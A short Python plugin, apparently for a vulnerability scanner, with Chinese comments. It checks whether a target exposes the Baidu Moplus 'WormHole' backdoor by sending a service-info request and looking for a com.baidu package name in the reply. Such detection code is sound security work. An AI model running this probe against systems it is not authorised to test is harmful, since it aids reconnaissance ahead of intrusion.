# coding:utf-8
from libs.core.register import register
from libs.core.attrdict import AttribDict
from libs.ui import UI

class Check():
    ui = UI()
    # 关于这个 Poc 的一些信息
    info = {
        "Author":"Medici.Yan",
        "Description": u'''

    检查 moplus WormHole
        ''',
    }
    # 要发送的 payload
    payload = "getserviceinfo?mcmdf=inapp_&callback=t"
    # options 是要手动设置的参数
    options = AttribDict()

    def callback(self, arg):
        '''回调函数'''
        _, msg = arg
        if _ and 'packagename":"com.baidu.' in msg:
            self.ui.notify.success('Target is vulnerable!')
        else:
            self.ui.notify.error('Target is not vulnerable!')
# 注册
register(Check)